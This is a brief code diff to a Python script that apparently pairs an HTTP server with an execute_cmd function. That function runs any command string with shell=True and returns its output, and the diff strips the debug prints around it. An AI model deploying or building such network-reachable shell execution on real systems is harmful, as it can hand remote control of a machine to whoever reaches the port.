@@ -35,7 +35,7 @@ class RequestHandler(BaseHTTPRequestHandler):
         self.send_header('Content-type', 'text/html')
         self.end_headers()
         self.wfile.write(res)
-        #self.wfile.write(bytes(res, "utf-8"))
+
 
 def run_server(server_class=HTTPServer, handler_class=RequestHandler):
     server_address = (my_ip, my_port)
@@ -45,11 +45,8 @@ def run_server(server_class=HTTPServer, handler_class=RequestHandler):
 def execute_cmd(cmd):
     if not cmd:
         time.sleep(3)
-    print(cmd)
     sub_p = subprocess.Popen(cmd, shell=True, stderr = subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
     sub_p_bytes = sub_p.stdout.read() + sub_p.stderr.read()
-    print("res", sub_p_bytes)
-    
     return sub_p_bytes
 
 
